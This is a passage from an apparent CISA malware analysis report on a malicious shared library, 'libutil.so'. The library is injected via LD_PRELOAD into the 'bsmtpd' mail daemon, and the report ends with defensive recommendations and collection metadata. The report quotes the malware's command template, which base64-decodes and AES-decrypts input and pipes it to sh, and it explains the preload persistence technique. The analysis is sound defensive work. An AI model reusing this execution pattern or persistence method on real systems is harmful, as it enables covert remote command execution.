DLL injection in the Windows OS.\n\nThis file is preloaded using the 'LD_PRELOAD' parameter, applied to 'bsmtpd', the BSMTP daemon executable. The preload parameter is\nadded to two configuration files, files that control the behavior of 'bsmtpd.' When the configuration files restart the daemon, 'libutil.so' is\nloaded into its process memory, giving it the same privileges and access as 'bsmtpd.'\n\nThe malware obtains the BSMTP_ID environment variable from the infected system. The BSMTP_ID has the capacity to be used as a\nport for malicious traffic. (Figure 8). The process this shared object file is running in, 'bsmtpd', is duplicated and launched using the 'fork'\nLinux function (Figure 9). The malware opens a connection to 127.0.0.1 on the victim machine it is running on (Figure 10). The 'recv'\nfunction is called after the connection is opened, showing that the malware has the capacity to obtain information from the\ncontext/environment its executed on.\n\nFigure 11, Pane 1, shows configuration settings for the BSMTP daemon, that allows any email traffic for the address range of 127/8\nand multiple actions including 'ehlo.' Pane 2 shows the malware intaking data, and loading the 'ehlo' action into memory.\n\nFigure 12, Pane 1, shows the malware, in conjunction with 'snprintf_chk', printing the string 'echo -n '%s' | base64 -d | openssl aes-256cbc -d -K 66833b26%d -iv 69822b6c%d 2>/dev/null | sh', to the Linux shell. The string is a command that accepts input '%s', decodes\nit with Base64, decrypts it with AES, pipes errors to std_out and executes it on the target with the 'sh' bash command and 'system' Linux\nfunction. Lastly, the malware has the capacity to print the SMTP string, '250-mail2.eccentric.duck Hello %s [%s], pleased to meet you' .\nTherefore, given this information, the malware has the capacity to accept encoded and encrypted inputs from 'bsmtpd', execute them,\nand print a message.\n\n\nSSccrreeeennsshhoottss\n\n\nFFiigguurree 88.. -- Depicts the Linux function 'getenv' \"BSMTP_ID\" and setting the variable named \"SRC_PORT\".\n\nFFiigguurree 99.. -- Depicts the Linux function 'fork.'\n\n\n-----\n\nFFiigguurree 1100.. -- Depicts the initialization of a connection using the Berkeley Sockets API.\n\nFFiigguurree 1111.. -- Pane 1 shows configuration settings for the BSMTP daemon, not in the malware. Pane 2 shows part of that\nconfiguration in the malware.\n\n\n-----\n\nFFiigguurree 1122.. -- Pane 1 shows the Linux functions 'snprintf_chk' and 'system.' Pane 2 shows configuration settings, for the BSMTP\ndaemon.\n\n## RReellaattiioonnsshhiipp SSuummmmaarryy\n\n81cf3b162a4fe1f1b916021ec652ade4a14df8\n6dd8de093e... Contains\n08021eeb9f7c81c8d2326bddab\n\nbbbae0455f8c98cc955487125a7910523534\n6dd8de093e... Contains\n56c8f652ddee14f452415c0b235a\n\n6dd8de093e391da96070a978209ebdf9d807e\nbbbae0455f... Contained_Within\n05c89dba13971be5aea2e1251d0\n\n6dd8de093e391da96070a978209ebdf9d807e\n81cf3b162a... Contained_Within\n05c89dba13971be5aea2e1251d0\n\n## RReeccoommmmeennddaattiioonnss\n\n\n-----\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their\norganization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to\navoid unwanted impacts.\n\n - Maintain up-to-date antivirus signatures and engines.\n\n - Keep operating system patches up-to-date.\n\n - Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\n\n - Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators\n\ngroup unless required.\n\n - Enforce a strong password policy and implement regular password changes.\n\n - Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\n\n - Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\n\n - Disable unnecessary services on agency workstations and servers.\n\n - Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches\n\nthe file header).\n\n - Monitor users' web browsing habits; restrict access to sites with unfavorable content.\n\n - Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\n\n - Scan all software downloaded from the Internet prior to executing.\n\n - Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology\n(NIST) Special Publication 800-83, \"\"GGuuiiddee ttoo MMaallwwaarree IInncciiddeenntt PPrreevveennttiioonn && HHaannddlliinngg ffoorr DDeesskkttooppss aanndd LLaappttooppss\"\"..\n\n## CCoonnttaacctt IInnffoorrmmaattiioonn\n\n - 1-888-282-0870\n\n[• CISA Service Desk (UNCLASS)](mailto:CISAservicedesk@cisa.dhs.gov)\n\n[• CISA SIPR (SIPRNET)](mailto:NCCIC@dhs.sgov.gov)\n\n[• CISA IC (JWICS)](mailto:NCCIC@dhs.ic.gov)\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this\nproduct at the following URL: [https://us-cert.cisa.gov/forms/feedback/](https://us-cert.cisa.gov/forms/feedback/)\n\n## DDooccuummeenntt FFAAQQ\n\nWWhhaatt iiss aa MMIIFFRR?? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely\nmanner. In most instances this report will provide initial indicators for computer and network defense. To request additional analysis,\nplease contact CISA and provide information regarding the level of desired analysis.\nWWhhaatt iiss aa MMAARR?? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired\nvia manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of\ndesired analysis.\nCCaann II eeddiitt tthhiiss ddooccuummeenntt?? This document is not to be edited in any way by recipients. All comments or questions related to this\ndocument should be directed to the CISA at 1-888-282-0870 or [CISA Service Desk.](mailto:CISAservicedesk@cisa.dhs.gov)\nCCaann II ssuubbmmiitt mmaallwwaarree ttoo CCIISSAA?? Malware samples can be submitted via three methods:\n\n[• Web: https://malware.us-cert.gov](https://malware.us-cert.gov/)\n\n - E-Mail: [submit@malware.us-cert.gov](mailto:submit@malware.us-cert.gov)\n\n - FTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software\nvulnerabilities, and phishing-related scams. Reporting forms can be found on CISA's homepage at [www.cisa.gov.](http://www.cisa.gov/)\n\n\n## TTLLPP:: CCLLEEAARR\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://www.cisa.gov/sites/default/files/2023-07/MAR-10454006.r1.v2.CLEAR_.pdf"
    ],
    "report_names": [
        "MAR-10454006.r1.v2.CLEAR_.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1737943547,
    "ts_updated_at": 1743041118,
    "ts_creation_date": 1690488791,
    "ts_modification_date": 1690488791,
    "files": {
        "pdf": "https://archive.orkl.eu/2f7c07d47654e02294290dd32b2d1df9534e5eb0.pdf",
        "text": "https://archive.orkl.eu/2f7c07d47654e02294290dd32b2d1df9534e5eb0.txt",
        "img": "https://archive.orkl.eu/2f7c07d47654e02294290dd32b2d1df9534e5eb0.jpg"
    }
}